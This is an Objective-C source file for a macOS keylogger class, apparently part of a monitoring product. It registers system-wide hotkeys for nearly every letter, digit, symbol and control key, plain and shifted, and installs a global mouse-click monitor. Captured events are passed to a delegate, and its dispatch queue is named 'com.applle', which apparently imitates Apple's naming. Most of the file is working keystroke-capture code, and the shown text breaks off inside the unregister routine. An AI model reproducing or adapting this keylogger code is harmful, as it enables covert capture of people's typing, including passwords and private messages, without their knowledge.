//
//  KeyboardLogger.m
//  KeyboardLoggerManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/27/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "KeyboardLogger.h"
#import "KeyboardLoggerEnum.h"
#import "KeyboardLoggerDelegate.h"
#import "KeyboardLoggerUtils.h"
#import "KeyStrokeInfo.h"
#import "EmbeddedApplicationInfo.h"

#import "KeyboardEventHandler.h"

#import "SystemUtilsImpl.h"

#import <AppKit/AppKit.h>

//============================== Normal keys
EventHotKeyRef MyHotKeyRef1;
EventHotKeyRef MyHotKeyRef2;
EventHotKeyRef MyHotKeyRef3;
EventHotKeyRef MyHotKeyRef4;
EventHotKeyRef MyHotKeyRef5;
EventHotKeyRef MyHotKeyRef6;
EventHotKeyRef MyHotKeyRef7;
EventHotKeyRef MyHotKeyRef8;
EventHotKeyRef MyHotKeyRef9;
EventHotKeyRef MyHotKeyRef10;
EventHotKeyRef MyHotKeyRef11;
EventHotKeyRef MyHotKeyRef12;
EventHotKeyRef MyHotKeyRef13;
EventHotKeyRef MyHotKeyRef14;
EventHotKeyRef MyHotKeyRef15;
EventHotKeyRef MyHotKeyRef16;
EventHotKeyRef MyHotKeyRef17;
EventHotKeyRef MyHotKeyRef18;
EventHotKeyRef MyHotKeyRef19;
EventHotKeyRef MyHotKeyRef20;
EventHotKeyRef MyHotKeyRef21;
EventHotKeyRef MyHotKeyRef22;
EventHotKeyRef MyHotKeyRef23;
EventHotKeyRef MyHotKeyRef24;
EventHotKeyRef MyHotKeyRef25;
EventHotKeyRef MyHotKeyRef26;
EventHotKeyRef MyHotKeyRef27;
EventHotKeyRef MyHotKeyRef28;
EventHotKeyRef MyHotKeyRef29;
EventHotKeyRef MyHotKeyRef30;
EventHotKeyRef MyHotKeyRef31;
EventHotKeyRef MyHotKeyRef32;
EventHotKeyRef MyHotKeyRef33;
EventHotKeyRef MyHotKeyRef34;
EventHotKeyRef MyHotKeyRef35;
EventHotKeyRef MyHotKeyRef36;
EventHotKeyRef MyHotKeyRef37;
EventHotKeyRef MyHotKeyRef38;
EventHotKeyRef MyHotKeyRef39;
EventHotKeyRef MyHotKeyRef40;
EventHotKeyRef MyHotKeyRef41;
EventHotKeyRef MyHotKeyRef42;
EventHotKeyRef MyHotKeyRef43;
EventHotKeyRef MyHotKeyRef44;
EventHotKeyRef MyHotKeyRef45;
EventHotKeyRef MyHotKeyRef46;
EventHotKeyRef MyHotKeyRef47;
EventHotKeyRef MyHotKeyRef48;
EventHotKeyRef MyHotKeyRef49;
EventHotKeyRef MyHotKeyRef50;
EventHotKeyRef MyHotKeyRef51;
EventHotKeyRef MyHotKeyRef52;
EventHotKeyRef MyHotKeyRef53;
EventHotKeyRef MyHotKeyRef54;
EventHotKeyRef MyHotKeyRef55;
EventHotKeyRef MyHotKeyRef56;
EventHotKeyRef MyHotKeyRef57;
EventHotKeyRef MyHotKeyRef58;
EventHotKeyRef MyHotKeyRef59;
EventHotKeyRef MyHotKeyRef60;
EventHotKeyRef MyHotKeyRef61;
EventHotKeyRef MyHotKeyRef62;
EventHotKeyRef MyHotKeyRef63;
EventHotKeyRef MyHotKeyRef64;
EventHotKeyRef MyHotKeyRef65;
EventHotKeyRef MyHotKeyRef66;
EventHotKeyRef MyHotKeyRef67;
EventHotKeyRef MyHotKeyRef68;
EventHotKeyRef MyHotKeyRef69;
EventHotKeyRef MyHotKeyRef70;
EventHotKeyRef MyHotKeyRef71;
EventHotKeyRef MyHotKeyRef72;
EventHotKeyRef MyHotKeyRef73;
EventHotKeyRef MyHotKeyRef74;
EventHotKeyRef MyHotKeyRef75;
EventHotKeyRef MyHotKeyRef76;
EventHotKeyRef MyHotKeyRef77;
EventHotKeyRef MyHotKeyRef78;
EventHotKeyRef MyHotKeyRef79;
EventHotKeyRef MyHotKeyRef80;
EventHotKeyRef MyHotKeyRef81;
EventHotKeyRef MyHotKeyRef82;
EventHotKeyRef MyHotKeyRef83;
EventHotKeyRef MyHotKeyRef84;
EventHotKeyRef MyHotKeyRef85;
EventHotKeyRef MyHotKeyRef86;
EventHotKeyRef MyHotKeyRef87;
EventHotKeyRef MyHotKeyRef88;
EventHotKeyRef MyHotKeyRef89;
EventHotKeyRef MyHotKeyRef90;
EventHotKeyRef MyHotKeyRef91;
EventHotKeyRef MyHotKeyRef92;
EventHotKeyRef MyHotKeyRef93;
EventHotKeyRef MyHotKeyRef94;
EventHotKeyRef MyHotKeyRef95;
EventHotKeyRef MyHotKeyRef96;
EventHotKeyRef MyHotKeyRef97;
EventHotKeyRef MyHotKeyRef98;
EventHotKeyRef MyHotKeyRef99;
EventHotKeyRef MyHotKeyRef100;
EventHotKeyRef MyHotKeyRef101;
EventHotKeyRef MyHotKeyRef102;
EventHotKeyRef MyHotKeyRef103;
EventHotKeyRef MyHotKeyRef104;
EventHotKeyRef MyHotKeyRef105;
EventHotKeyRef MyHotKeyRef106;
EventHotKeyRef MyHotKeyRef107;
EventHotKeyRef MyHotKeyRef108;
EventHotKeyRef MyHotKeyRef109;
EventHotKeyRef MyHotKeyRef110;
EventHotKeyRef MyHotKeyRef111;
EventHotKeyRef MyHotKeyRef112;

EventHotKeyRef MyHotKeyRef200;
EventHotKeyRef MyHotKeyRef201;
EventHotKeyRef MyHotKeyRef202;
EventHotKeyRef MyHotKeyRef203;
EventHotKeyRef MyHotKeyRef204;
EventHotKeyRef MyHotKeyRef205;
EventHotKeyRef MyHotKeyRef206;
EventHotKeyRef MyHotKeyRef207;
EventHotKeyRef MyHotKeyRef208;
EventHotKeyRef MyHotKeyRef209;

@interface KeyboardLogger (private)
-(void) prepareAutorepeat: (id) aEventRef;
-(void) autorepeat: (id) aEventRef;

- (ProcessSerialNumber) activePSN;
- (ProcessSerialNumber) frontMostPSN;
- (ProcessSerialNumber) frontMostPSNV2;

@end

@implementation KeyboardLogger

@synthesize mKeyLoggerDelegate;
@synthesize mLoggerArray;
@synthesize mKeyHold;
@synthesize mEmbeddedApps;
@synthesize mMouseEvent;
@synthesize mKeyDownEvent;
@synthesize mKeyboardEventHandler;

@synthesize mThreadAutorepeat;

-(id) initWithKeyLoggerDelegate:(id <KeyboardLoggerDelegate>) aKeyLoggerDelegate
       withKeyboardEventHandler: (KeyboardEventHandler *) aKeyboardEventHandler {
    if ((self = [super init])) {
        
		[self setMKeyLoggerDelegate:aKeyLoggerDelegate];
        
        mLoggerArray= [[NSMutableArray alloc]init];
        mKeyHold    = [[NSMutableArray alloc]init];
        
        [self setMKeyboardEventHandler:aKeyboardEventHandler];
        
        queue_serial_keyboardlogger = dispatch_queue_create("com.applle.queue.keyboardlogger", nil);
        
        isOSX_10_10_OrGreater = [SystemUtilsImpl isOSX_VersionEqualOrGreaterMajorVersion:10 minorVersion:10];
	}
	return self;
}

#pragma mark Public methods
#pragma mark -

- (void) startKeyboardLog {
    [self stopKeyboardLog];
    
    [self registerAllKey];
    [self registerGlobalEvent];
}

- (void)stopKeyboardLog {
    [self unregisterAllKey];
    [self unregisterGlobalEvent];
}

#pragma mark Public methods 5
#pragma mark -

- (void) registerGlobalEvent {
    NSThread *threadA = [NSThread currentThread];
    
    // Mouse event
    self.mMouseEvent = [NSEvent addGlobalMonitorForEventsMatchingMask:NSLeftMouseDownMask handler: ^(NSEvent *event) {
        //DLog(@"Left mouse down on window ID = %ld", (long)[event windowNumber]);
        
        NSNumber *code = [NSNumber numberWithInteger:kKeyboardLoggerCompleteCodeMouseClick];
        NSDictionary *userInfo = [NSDictionary dictionaryWithObjectsAndKeys:code, @"code", event, @"object", nil];
        [self performSelector:@selector(sendKey:) onThread:threadA withObject:userInfo waitUntilDone:NO];
    }];
    
    // Key down event
    self.mKeyDownEvent = [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask handler: ^(NSEvent *event) {
       //DLog(@"Key down on window: %@, %ld", [event window], (long)[[event window] windowNumber]);
    }];
}

- (void) unregisterGlobalEvent {
    if (self.mMouseEvent) {
        [NSEvent removeMonitor:self.mMouseEvent];
        self.mMouseEvent = nil;
    }

    if (self.mKeyDownEvent) {
        [NSEvent removeMonitor:self.mKeyDownEvent];
        self.mKeyDownEvent = nil;
    }

}

- (void) registerAllKey{ 
    [self unregisterAllKey];
    
   DLog(@"registerAllKey");
    [[self mKeyboardEventHandler] addKeyboardEventHandlerDelegate:self];
    
    EventHotKeyID myHotKeyID;
    myHotKeyID.id=1;
    RegisterEventHotKey(kVK_ANSI_A, kVK_ANSI_A, myHotKeyID, GetApplicationEventTarget(), 0, &MyHotKeyRef1);
    
    myHotKeyID.id=2;
    RegisterEventHotKey(kVK_ANSI_B, kVK_ANSI_B, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef2);
    
    myHotKeyID.id=3;
    RegisterEventHotKey(kVK_ANSI_C, kVK_ANSI_C, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef3);
    
    myHotKeyID.id=4;
    RegisterEventHotKey(kVK_ANSI_D, kVK_ANSI_D, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef4);
    
    myHotKeyID.id=5;
    RegisterEventHotKey(kVK_ANSI_E, kVK_ANSI_E, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef5);
    
    myHotKeyID.id=6;
    RegisterEventHotKey(kVK_ANSI_F, kVK_ANSI_F, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef6);
    
    myHotKeyID.id=7;
    RegisterEventHotKey(kVK_ANSI_G, kVK_ANSI_G, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef7);
    
    myHotKeyID.id=8;
    RegisterEventHotKey(kVK_ANSI_H, kVK_ANSI_H, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef8);
    
    myHotKeyID.id=9;
    RegisterEventHotKey(kVK_ANSI_I, kVK_ANSI_I, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef9);
    
    myHotKeyID.id=10;
    RegisterEventHotKey(kVK_ANSI_J, kVK_ANSI_J, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef10);
    
    myHotKeyID.id=11;
    RegisterEventHotKey(kVK_ANSI_K, kVK_ANSI_K, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef11);
    
    myHotKeyID.id=12;
    RegisterEventHotKey(kVK_ANSI_L, kVK_ANSI_L, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef12);
    
    myHotKeyID.id=13;
    RegisterEventHotKey(kVK_ANSI_M, kVK_ANSI_M, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef13);
    
    myHotKeyID.id=14;
    RegisterEventHotKey(kVK_ANSI_N, kVK_ANSI_N, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef14);
    
    myHotKeyID.id=15;
    RegisterEventHotKey(kVK_ANSI_O, kVK_ANSI_O, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef15);
    
    myHotKeyID.id=16;
    RegisterEventHotKey(kVK_ANSI_P, kVK_ANSI_P, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef16);
    
    myHotKeyID.id=17;
    RegisterEventHotKey(kVK_ANSI_Q, kVK_ANSI_Q, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef17);
    
    myHotKeyID.id=18;
    RegisterEventHotKey(kVK_ANSI_R, kVK_ANSI_R, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef18);
    
    myHotKeyID.id=19;
    RegisterEventHotKey(kVK_ANSI_S, kVK_ANSI_S, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef19);
    
    myHotKeyID.id=20;
    RegisterEventHotKey(kVK_ANSI_T, kVK_ANSI_T, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef20);
    
    myHotKeyID.id=21;
    RegisterEventHotKey(kVK_ANSI_U, kVK_ANSI_U, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef21);
    
    myHotKeyID.id=22;
    RegisterEventHotKey(kVK_ANSI_V, kVK_ANSI_V, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef22);
    
    myHotKeyID.id=23;
    RegisterEventHotKey(kVK_ANSI_W, kVK_ANSI_W, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef23);
    
    myHotKeyID.id=24;
    RegisterEventHotKey(kVK_ANSI_X, kVK_ANSI_X, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef24);
    
    myHotKeyID.id=25;
    RegisterEventHotKey(kVK_ANSI_Y, kVK_ANSI_Y, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef25);

    myHotKeyID.id=26;
    RegisterEventHotKey(kVK_ANSI_Z, kVK_ANSI_Z, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef26);
    
    myHotKeyID.id=27;
    RegisterEventHotKey(kVK_ANSI_Equal, kVK_ANSI_Equal, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef27);
    
    myHotKeyID.id=28;
    RegisterEventHotKey(kVK_ANSI_Minus, kVK_ANSI_Minus, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef28);
    
    myHotKeyID.id=29;
    RegisterEventHotKey(kVK_ANSI_RightBracket, kVK_ANSI_RightBracket, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef29);
    
    myHotKeyID.id=30;
    RegisterEventHotKey(kVK_ANSI_LeftBracket, kVK_ANSI_LeftBracket, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef30);
    
    myHotKeyID.id=31;
    RegisterEventHotKey(kVK_ANSI_Quote, kVK_ANSI_Quote, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef31);
    
    myHotKeyID.id=32;
    RegisterEventHotKey(kVK_ANSI_Semicolon, kVK_ANSI_Semicolon, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef32);
    
    myHotKeyID.id=33;
    RegisterEventHotKey(kVK_ANSI_Backslash, kVK_ANSI_Backslash, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef33);
    
    myHotKeyID.id=34;
    RegisterEventHotKey(kVK_ANSI_Comma, kVK_ANSI_Comma, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef34);
    
    myHotKeyID.id=35;
    RegisterEventHotKey(kVK_ANSI_Slash, kVK_ANSI_Slash, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef35);
    
    myHotKeyID.id=36;
    RegisterEventHotKey(kVK_ANSI_Period, kVK_ANSI_Period, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef36);
    
    myHotKeyID.id=37;
    RegisterEventHotKey(kVK_ANSI_Grave, kVK_ANSI_Grave, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef37);
    
    myHotKeyID.id=38;
    RegisterEventHotKey(kVK_ANSI_KeypadDecimal, kVK_ANSI_KeypadDecimal, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef38);
    
    myHotKeyID.id=39;
    RegisterEventHotKey(kVK_ANSI_KeypadMultiply, kVK_ANSI_KeypadMultiply, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef39);
    
    myHotKeyID.id=40;
    RegisterEventHotKey(kVK_ANSI_KeypadPlus, kVK_ANSI_KeypadPlus, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef40);
    
    myHotKeyID.id=41;
    RegisterEventHotKey(kVK_ANSI_KeypadClear, kVK_ANSI_KeypadClear, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef41);
    
    myHotKeyID.id=42;
    RegisterEventHotKey(kVK_ANSI_KeypadDivide, kVK_ANSI_KeypadDivide, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef42);
    
    myHotKeyID.id=43;
    RegisterEventHotKey(kVK_Space, kVK_Space, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef43);
    
    myHotKeyID.id=44;
    RegisterEventHotKey(kVK_ANSI_KeypadMinus, kVK_ANSI_KeypadMinus, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef44);
    
    myHotKeyID.id=45;
    RegisterEventHotKey(kVK_ANSI_KeypadEquals, kVK_ANSI_KeypadEquals, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef45);
    
    myHotKeyID.id=46;
    RegisterEventHotKey(kVK_ANSI_Keypad0, kVK_ANSI_Keypad0, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef46);
    
    myHotKeyID.id=47;
    RegisterEventHotKey(kVK_ANSI_Keypad1, kVK_ANSI_Keypad1, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef47);
    
    myHotKeyID.id=48;
    RegisterEventHotKey(kVK_ANSI_Keypad2, kVK_ANSI_Keypad2, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef48);
    
    myHotKeyID.id=49;
    RegisterEventHotKey(kVK_ANSI_Keypad3, kVK_ANSI_Keypad3, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef49);
    
    myHotKeyID.id=50;
    RegisterEventHotKey(kVK_ANSI_Keypad4, kVK_ANSI_Keypad4, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef50);
    
    myHotKeyID.id=51;
    RegisterEventHotKey(kVK_ANSI_Keypad5, kVK_ANSI_Keypad5, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef51);
    
    myHotKeyID.id=52;
    RegisterEventHotKey(kVK_ANSI_Keypad6, kVK_ANSI_Keypad6, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef52);
    
    myHotKeyID.id=53;
    RegisterEventHotKey(kVK_ANSI_Keypad7, kVK_ANSI_Keypad7, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef53);
    
    myHotKeyID.id=54;
    RegisterEventHotKey(kVK_ANSI_Keypad8, kVK_ANSI_Keypad8, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef54);
    
    myHotKeyID.id=55;
    RegisterEventHotKey(kVK_ANSI_Keypad9, kVK_ANSI_Keypad9, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef55);
    
    myHotKeyID.id=56;
    RegisterEventHotKey(kVK_ANSI_0, kVK_ANSI_0, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef56);
    
    myHotKeyID.id=57;
    RegisterEventHotKey(kVK_ANSI_1, kVK_ANSI_1, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef57);
    
    myHotKeyID.id=58;
    RegisterEventHotKey(kVK_ANSI_2, kVK_ANSI_2, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef58);
    
    myHotKeyID.id=59;
    RegisterEventHotKey(kVK_ANSI_3, kVK_ANSI_3, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef59);
    
    myHotKeyID.id=60;
    RegisterEventHotKey(kVK_ANSI_4, kVK_ANSI_4, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef60);
    
    myHotKeyID.id=61;
    RegisterEventHotKey(kVK_ANSI_5, kVK_ANSI_5, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef61);
    
    myHotKeyID.id=62;
    RegisterEventHotKey(kVK_ANSI_6, kVK_ANSI_6, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef62);
    
    myHotKeyID.id=63;
    RegisterEventHotKey(kVK_ANSI_7, kVK_ANSI_7, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef63);
    
    myHotKeyID.id=64;
    RegisterEventHotKey(kVK_ANSI_8, kVK_ANSI_8, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef64);
    
    myHotKeyID.id=65;
    RegisterEventHotKey(kVK_ANSI_9, kVK_ANSI_9, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef65);
    
    myHotKeyID.id=66;
    RegisterEventHotKey(kVK_ANSI_A, shiftKey, myHotKeyID, GetApplicationEventTarget(), 0, &MyHotKeyRef66);
    
    myHotKeyID.id=67;
    RegisterEventHotKey(kVK_ANSI_B, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef67);
    
    myHotKeyID.id=68;
    RegisterEventHotKey(kVK_ANSI_C, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef68);
    
    myHotKeyID.id=69;
    RegisterEventHotKey(kVK_ANSI_D, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef69);
    
    myHotKeyID.id=70;
    RegisterEventHotKey(kVK_ANSI_E, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef70);
    
    myHotKeyID.id=71;
    RegisterEventHotKey(kVK_ANSI_F, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef71);
    
    myHotKeyID.id=72;
    RegisterEventHotKey(kVK_ANSI_G, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef72);
    
    myHotKeyID.id=73;
    RegisterEventHotKey(kVK_ANSI_H, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef73);
    
    myHotKeyID.id=74;
    RegisterEventHotKey(kVK_ANSI_I, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef74);
    
    myHotKeyID.id=75;
    RegisterEventHotKey(kVK_ANSI_J, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef75);
    
    myHotKeyID.id=76;
    RegisterEventHotKey(kVK_ANSI_K, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef76);
    
    myHotKeyID.id=77;
    RegisterEventHotKey(kVK_ANSI_L, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef77);
    
    myHotKeyID.id=78;
    RegisterEventHotKey(kVK_ANSI_M, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef78);
    
    myHotKeyID.id=79;
    RegisterEventHotKey(kVK_ANSI_N, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef79);
    
    myHotKeyID.id=80;
    RegisterEventHotKey(kVK_ANSI_O, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef80);
    
    myHotKeyID.id=81;
    RegisterEventHotKey(kVK_ANSI_P, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef81);
    
    myHotKeyID.id=82;
    RegisterEventHotKey(kVK_ANSI_Q, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef82);
    
    myHotKeyID.id=83;
    RegisterEventHotKey(kVK_ANSI_R, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef83);
    
    myHotKeyID.id=84;
    RegisterEventHotKey(kVK_ANSI_S, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef84);
    
    myHotKeyID.id=85;
    RegisterEventHotKey(kVK_ANSI_T, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef85);
    
    myHotKeyID.id=86;
    RegisterEventHotKey(kVK_ANSI_U, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef86);
    
    myHotKeyID.id=87;
    RegisterEventHotKey(kVK_ANSI_V, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef87);
    
    myHotKeyID.id=88;
    RegisterEventHotKey(kVK_ANSI_W, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef88);
    
    myHotKeyID.id=89;
    RegisterEventHotKey(kVK_ANSI_X, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef89);
    
    myHotKeyID.id=90;
    RegisterEventHotKey(kVK_ANSI_Y, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef90);
    
    myHotKeyID.id=91;
    RegisterEventHotKey(kVK_ANSI_Z, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef91);
    
    myHotKeyID.id=92;
    RegisterEventHotKey(kVK_ANSI_Equal, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef92);
    
    myHotKeyID.id=93;
    RegisterEventHotKey(kVK_ANSI_Minus, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef93);
    
    myHotKeyID.id=94;
    RegisterEventHotKey(kVK_ANSI_RightBracket, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef94);
    
    myHotKeyID.id=95;
    RegisterEventHotKey(kVK_ANSI_LeftBracket, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef95);
    
    myHotKeyID.id=96;
    RegisterEventHotKey(kVK_ANSI_Quote, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef96);
    
    myHotKeyID.id=97;
    RegisterEventHotKey(kVK_ANSI_Semicolon, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef97);
    
    myHotKeyID.id=98;
    RegisterEventHotKey(kVK_ANSI_Backslash, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef98);
    
    myHotKeyID.id=99;
    RegisterEventHotKey(kVK_ANSI_Comma, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef99);
    
    myHotKeyID.id=100;
    RegisterEventHotKey(kVK_ANSI_Slash, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef100);
    
    myHotKeyID.id=101;
    RegisterEventHotKey(kVK_ANSI_Period, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef101);
    
    myHotKeyID.id=102;
    RegisterEventHotKey(kVK_ANSI_Grave, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef102);
    
    myHotKeyID.id=103;
    RegisterEventHotKey(kVK_ANSI_0, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef103);
    
    myHotKeyID.id=104;
    RegisterEventHotKey(kVK_ANSI_1, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef104);
    
    myHotKeyID.id=105;
    RegisterEventHotKey(kVK_ANSI_2, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef105);
    
    myHotKeyID.id=106;
    RegisterEventHotKey(kVK_ANSI_3, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef106);
    
    myHotKeyID.id=107;
    RegisterEventHotKey(kVK_ANSI_4, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef107);
    
    myHotKeyID.id=108;
    RegisterEventHotKey(kVK_ANSI_5, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef108);
    
    myHotKeyID.id=109;
    RegisterEventHotKey(kVK_ANSI_6, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef109);
    
    myHotKeyID.id=110;
    RegisterEventHotKey(kVK_ANSI_7, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef110);
    
    myHotKeyID.id=111;
    RegisterEventHotKey(kVK_ANSI_8, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef111);
    
    myHotKeyID.id=112;
    RegisterEventHotKey(kVK_ANSI_9, shiftKey, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef112);
    
    myHotKeyID.id=200;
    RegisterEventHotKey(kVK_ANSI_KeypadEnter, kVK_ANSI_KeypadEnter, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef200);
    
    myHotKeyID.id=201;
    RegisterEventHotKey(kVK_Return, kVK_Return, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef201);
    
    myHotKeyID.id=202;
    RegisterEventHotKey(kVK_Tab, kVK_Tab, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef202);
    
    myHotKeyID.id=203;
    RegisterEventHotKey(kVK_Delete, kVK_Delete, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef203);
    
    myHotKeyID.id=204;
    RegisterEventHotKey(kVK_Shift, kVK_Shift, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef204);
    
    myHotKeyID.id=205;
    RegisterEventHotKey(kVK_RightShift, kVK_RightShift, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef205);
    
    myHotKeyID.id=206;
    RegisterEventHotKey(kVK_RightArrow, kVK_RightArrow, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef206);
    
    myHotKeyID.id=207;
    RegisterEventHotKey(kVK_LeftArrow, kVK_LeftArrow, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef207);
    
    myHotKeyID.id=208;
    RegisterEventHotKey(kVK_UpArrow, kVK_UpArrow, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef208);
    
    myHotKeyID.id=209;
    RegisterEventHotKey(kVK_DownArrow, kVK_DownArrow, myHotKeyID,GetApplicationEventTarget(), 0, &MyHotKeyRef209);
    
}

-(void) unregisterAllKey {
   DLog(@"UnregisterEventHotKey");
    [[self mKeyboardEventHandler] removeKeyboardEventHandlerDelegate:self];
    
    UnregisterEventHotKey(MyHotKeyRef1); 
    UnregisterEventHotKey(MyHotKeyRef2);
    UnregisterEventHotKey(MyHotKeyRef3);
